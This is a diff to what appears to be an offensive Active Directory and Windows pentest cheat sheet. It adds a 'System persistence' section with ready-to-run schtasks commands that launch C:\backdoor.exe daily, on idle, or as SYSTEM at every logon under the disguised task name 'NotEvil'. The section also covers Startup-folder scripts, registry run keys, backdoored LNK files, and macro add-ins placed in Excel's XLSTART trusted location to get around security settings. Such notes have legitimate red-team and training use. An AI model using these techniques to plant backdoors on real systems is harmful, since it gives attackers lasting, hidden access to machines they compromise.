@@ -12,7 +12,9 @@
   * [SecurityDescriptor - Remote Registry](#SecurityDescriptor---Remote-Registry)
   * [msDS-AllowedToDelegateTo](#msDS-AllowedToDelegateTo)
 * [Computer Account](#Computer-Account)
-
+* [System Persistence](#System-persistence)
+  * [User land](#User-land)
+  * [Elevated](#Elevated)
 
 ## Golden ticket
 - https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets
@@ -325,4 +327,36 @@ New-MachineAccount -Domain <DOMAIN> -MachineAccount <NAME OF MACHINE TO ADD> -Do
 ### Runas computeraccount
 ```
 runas /netonly /user:<DOMAIN>\<COMPUTERACCOUNTNAME> powershell
+```
+
+## System persistence
+### Userland
+#### Startup
+- Batch script inside user directory $env:APPDATA'\Microsoft\Windows\Start Menu\Programs\Startup\'
+
+#### Registery keys
+- https://attack.mitre.org/techniques/T1060/
+
+#### LNK
+- Modify links to execute arbritary code
+- https://github.com/HarmJ0y/Misc-PowerShell/blob/master/BackdoorLNK.ps1
+
+#### Schtasks
+```
+# Daily at 10:00
+schtasks /create /tn "NotEvil" /tr C:\backdoor.exe /sc daily /st 10:00
+
+# Run a task each time the user's sessions is idle for 10 minutes
+schtasks /create /tn "NotEvil" /tr C:\backdoor.exe /sc onidle /i 10
+```
+
+#### Microsoft Office Trusted Locations
+- Allow DLL or macros to execute despite the configured security settings (Ignored if macro's or add-ins have been blocked by GPO)
+- Create a new Excel document with a module containing the persistence mechanism. Save it as "Excel Add-in" inside ```%APPDATA%\Microsoft\Excel\XLSTART``` and it will be launched every tim the user opens MS Excel application.
+
+### Elevated
+#### Schtasks
+```
+# Run task as system each time a user logs in
+schtasks /create /ru "NT AUTHORITY\SYSTEM" /rp "" /tn "NotEvil" /tr C:\backdoor.exe /sc onlogon
 ```
